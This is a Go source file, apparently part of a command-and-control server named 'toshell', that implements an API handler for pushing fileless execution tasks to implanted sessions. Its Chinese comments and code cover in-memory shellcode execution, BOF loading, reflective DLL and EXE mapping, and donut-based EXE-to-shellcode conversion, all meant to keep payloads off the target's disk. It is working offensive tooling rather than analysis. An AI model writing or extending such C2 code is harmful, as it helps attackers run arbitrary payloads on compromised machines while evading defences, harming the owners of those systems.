package api

import (
	"encoding/base64"
	"encoding/json"
	"net/http"

	"github.com/gorilla/mux"
	"toshell/internal/server/logging"
)

// filelessExecRequest 全内存无文件执行请求。
//
// kind:
//   - shellcode：payload_b64 直接作为 shellcode 下发，VirtualAlloc + CreateThread；
//   - bof：内存 COFF 执行，args 作为 BOF 参数；
//   - dll：反射式 PE 加载（映射 + 重定位 + 导入表），entry 指定导出函数；
//   - exe：服务端用 donut 把 EXE 转成位置无关 shellcode 再下发，args 作为被转换
//     程序的命令行（donut 上限 255 字节）；需要 64 位 donut 时可 arch=amd64；
//   - exe_mem：**不走 donut**，直接由植入端反射式映射执行 EXE（要求 EXE 与植入体
//     同架构），args 通过 PEB 命令行注入；wait_ms > 0 时等线程结束并回传退出码。
type filelessExecRequest struct {
	Kind       string `json:"kind"`
	PayloadB64 string `json:"payload_b64"`
	Args       string `json:"args"`    // BOF 参数 / EXE 命令行 / DLL 导出参数
	Entry      string `json:"entry"`   // DLL 导出函数名 / EXE 镜像名（argv[0]）
	Arch       string `json:"arch"`    // exe→shellcode 转换时指定目标架构
	WaitMs     int    `json:"wait_ms"` // exe_mem：等待执行线程结束的毫秒数（0=不等待）
}

func (s *Server) filelessExecHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	vars := mux.Vars(r)
	id := vars["id"]

	var req filelessExecRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, `{"error":"Invalid request body"}`, http.StatusBadRequest)
		return
	}
	if req.PayloadB64 == "" {
		http.Error(w, `{"error":"payload_b64 is required"}`, http.StatusBadRequest)
		return
	}
	if s.listener == nil {
		http.Error(w, `{"error":"Listener not available"}`, http.StatusInternalServerError)
		return
	}

	kind := req.Kind
	payloadB64 := req.PayloadB64

	// exe → donut shellcode：在服务端完成转换，目标机全程不落盘
	if kind == "exe" {
		raw, err := base64.StdEncoding.DecodeString(payloadB64)
		if err != nil {
			http.Error(w, `{"error":"payload_b64 is not valid base64"}`, http.StatusBadRequest)
			return
		}
		arch := req.Arch
		if arch == "" {
			arch = "amd64"
		}
		sc, err := s.builder.ConvertToShellcodeWithParams(raw, arch, req.Args)
		if err != nil {
			http.Error(w, `{"error":"`+err.Error()+`"}`, http.StatusInternalServerError)
			return
		}
		payloadB64 = base64.StdEncoding.EncodeToString(sc)
		kind = "shellcode"
	}

	taskInfo, err := s.taskMgr.CreateFilelessExec(id, kind, payloadB64, req.Args, req.Entry, req.WaitMs)
	if err != nil {
		http.Error(w, `{"error":"`+err.Error()+`"}`, http.StatusInternalServerError)
		return
	}
	if err := s.listener.PushTask(id, taskInfo); err != nil {
		http.Error(w, `{"error":"`+err.Error()+`"}`, http.StatusInternalServerError)
		return
	}

	logging.Info("api", "fileless-exec (%s) pushed to session %s (args=%q entry=%q wait_ms=%d)", kind, id, req.Args, req.Entry, req.WaitMs)
	json.NewEncoder(w).Encode(map[string]interface{}{
		"task_id":   taskInfo.ID,
		"task_type": taskInfo.TaskType,
		"kind":      kind,
		"args":      req.Args,
		"message":   "fileless execution task pushed",
	})
}
